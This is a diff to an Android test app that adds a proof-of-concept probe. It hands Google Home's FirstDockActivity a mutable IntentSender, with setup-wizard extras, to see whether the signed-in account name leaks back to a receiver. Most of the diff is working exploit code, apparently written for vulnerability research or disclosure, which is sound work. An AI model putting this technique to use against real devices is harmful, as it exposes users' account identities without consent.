@@ -51,8 +51,10 @@ public class MainActivity extends Activity {
             sendBleScanned();
         } else if ("activity".equals(action)) {
             startDockActivity();
+        } else if ("dock".equals(action)) {
+            startDockActivityWithSender();
         } else {
-            Log.i(TAG, "actions: broadcast | activity");
+            Log.i(TAG, "actions: broadcast | activity | dock");
         }
         finish();
     }
@@ -99,6 +101,57 @@ public class MainActivity extends Activity {
         a.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 
         Log.i(TAG, "STARTACT from " + getPackageName() + " -> " + HOME + "/" + DOCK_ACTIVITY);
+        try {
+            startActivity(a);
+            Log.i(TAG, "startActivity() returned, no exception");
+        } catch (SecurityException e) {
+            Log.i(TAG, "SECURITY " + e.getMessage());
+        } catch (Throwable t) {
+            Log.i(TAG, "THREW " + t.getClass().getName() + ": " + t.getMessage());
+        }
+    }
+
+    /**
+     * Starts the same activity, but hands it an IntentSender of ours.
+     *
+     * FirstDockActivity.C() reads an IntentSender out of the incoming
+     * intent's "android.intent.extra.INTENT" extra, builds a
+     * "com.android.wizard.NEXT" intent, copies the wizard extras across
+     * from the intent that started it, merges in an "accountName" extra
+     * holding the signed-in account, and calls
+     * startIntentSenderForResult() on the IntentSender the caller gave it.
+     *
+     * So this asks the question directly: does Google Home fill that intent
+     * with the account name and hand it to an app that only declared an
+     * orphaned permission name? Whatever arrives lands in SinkReceiver.
+     *
+     * The PendingIntent has to be mutable, or the fill-in intent is ignored
+     * on Android 12 and later and nothing would arrive even if the app did
+     * send it — a silent negative that would look like a working guard.
+     */
+    private void startDockActivityWithSender() {
+        Intent sink = new Intent(this, SinkReceiver.class);
+        android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(
+                this, 0, sink,
+                android.app.PendingIntent.FLAG_UPDATE_CURRENT
+                        | android.app.PendingIntent.FLAG_MUTABLE);
+
+        Intent a = new Intent();
+        a.setComponent(new ComponentName(HOME, DOCK_ACTIVITY));
+        a.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        a.putExtra("android.intent.extra.INTENT", pi.getIntentSender());
+
+        // The extras it copies into the intent it sends back. They are set
+        // so the setup flow it launches behaves as it would in the flow this
+        // activity belongs to, rather than bailing out early.
+        a.putExtra("wizardBundle", new Bundle());
+        a.putExtra("firstRun", true);
+        a.putExtra("isSetupFlow", true);
+        a.putExtra("theme", "glif_v3_light");
+        a.putExtra("suw_lifecycle", 0);
+
+        Log.i(TAG, "DOCK from " + getPackageName() + " -> " + HOME + "/" + DOCK_ACTIVITY
+                   + "  (handing over our own IntentSender)");
         try {
             startActivity(a);
             Log.i(TAG, "startActivity() returned, no exception");
